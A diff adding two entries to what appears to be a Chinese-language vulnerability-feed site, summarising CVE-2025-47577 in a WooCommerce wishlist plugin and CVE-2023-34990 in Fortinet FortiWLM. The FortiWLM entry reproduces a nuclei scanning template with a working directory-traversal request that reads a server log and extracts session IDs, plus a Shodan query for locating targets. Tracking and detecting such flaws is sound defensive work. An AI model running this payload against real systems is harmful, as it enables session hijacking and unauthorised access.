@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>TI WooCommerce Wishlist 未授权访问漏洞</title>
+    <link href="/2025/06/04/github_1657099127/"/>
+    <url>/2025/06/04/github_1657099127/</url>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> TI WooCommerce Wishlist 未授权访问漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-47577</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> TI WooCommerce Wishlist插件中存在一个未授权访问漏洞，攻击者可以利用此漏洞在未授权的情况下执行某些操作。该漏洞的利用需要WooCommerce、TI WooCommerce Wishlist和WC fields Factory插件在WordPress站点上处于活动状态。</p><p><strong>产品厂商：</strong> TI</p><p><strong>产品名称：</strong> TI WooCommerce Wishlist</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12251">https://github.com/projectdiscovery/nuclei-templates/issues/12251</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### Is there an existing template for this?<br><br>- [x] I have searched the existing templates.<br><br>### Template requests<br><br>- CVE<span class="hljs-number">-2025</span><span class="hljs-number">-47577</span><br><br><br>### Anything else?<br><br>- Exploit: https:<span class="hljs-comment">//github.com/Yucaerin/CVE-2025-47577</span><br>- Blog Post: https:<span class="hljs-comment">//patchstack.com/articles/unpatched-critical-vulnerability-in-ti-woocommerce-wishlist-plugin/</span><br>- To reproduce the vulnerability, the following plugins must be active on the WordPress site: WooCommerce, TI WooCommerce Wishlist, WC fields Factory.<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>未授权访问</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>FortiWLM 目录遍历漏洞</title>
+    <link href="/2025/06/04/github_4148219186/"/>
+    <url>/2025/06/04/github_4148219186/</url>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> FortiWLM 目录遍历漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-34990</li></ul><p><strong>漏洞类型：</strong> 目录遍历</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Fortinet FortiWLM版本8.6.0至8.6.5和8.5.0至8.5.4中存在相对路径遍历漏洞，攻击者可通过特制的web请求执行未授权的代码或命令。</p><p><strong>产品厂商：</strong> Fortinet</p><p><strong>产品名称：</strong> FortiWLM</p><p><strong>影响版本：</strong> 8.6.0 &lt;&#x3D; version &lt;&#x3D; 8.6.5, 8.5.0 &lt;&#x3D; version &lt;&#x3D; 8.5.4</p><p><strong>搜索语法：</strong> title:”FortiWLM Login”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/aef470b7cd348f30f72ede35a7832a0a179838a3/http%2Fcves%2F2023%2FCVE-2023-34990.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/aef470b7cd348f30f72ede35a7832a0a179838a3/http%2Fcves%2F2023%2FCVE-2023-34990.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">34990</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> FortiWLM <span class="hljs-operator">-</span> Directory Traversal<br>  <span class="hljs-params">author:</span> DhiyaneshDk<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    A relative path traversal <span class="hljs-keyword">in</span> Fortinet FortiWLM version <span class="hljs-number">8.6</span>.<span class="hljs-number">0</span> through <span class="hljs-number">8.6</span>.<span class="hljs-number">5</span> and <span class="hljs-number">8.5</span>.<span class="hljs-number">0</span> through <span class="hljs-number">8.5</span>.<span class="hljs-number">4</span> allows attacker to execute unauthorized code <span class="hljs-keyword">or</span> commands via specially crafted web requests.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//fortiguard.com/psirt/FG-IR-23-144</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">34990</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">94</span>,CWE-<span class="hljs-number">23</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.00272</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.50596</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;FortiWLM Login&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2023,fortiwlm,lfi,cisa<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>wlm<span class="hljs-operator">/</span>login<span class="hljs-operator">?</span>next<span class="hljs-operator">=</span><span class="hljs-symbol">/wlm</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(body, <span class="hljs-string">&quot;&lt;title&gt;FortiWLM Login&lt;/title&gt;&quot;</span>)&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>ems<span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>ezrf_lighttpd.cgi<span class="hljs-operator">?</span>op_type<span class="hljs-operator">=</span>upgradelogs&amp;imagename<span class="hljs-operator">=</span><span class="hljs-symbol">../../../../../../../../../data/apps/nms/logs/httpd_error_log</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> response<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;sessionid<span class="hljs-operator">=</span>([A-F0-<span class="hljs-number">9</span>]<span class="hljs-operator">+</span>)&#x27;<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>目录遍历</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Motors 未授权权限提升漏洞</title>
     <link href="/2025/06/04/github_699556829/"/>
     <url>/2025/06/04/github_699556829/</url>
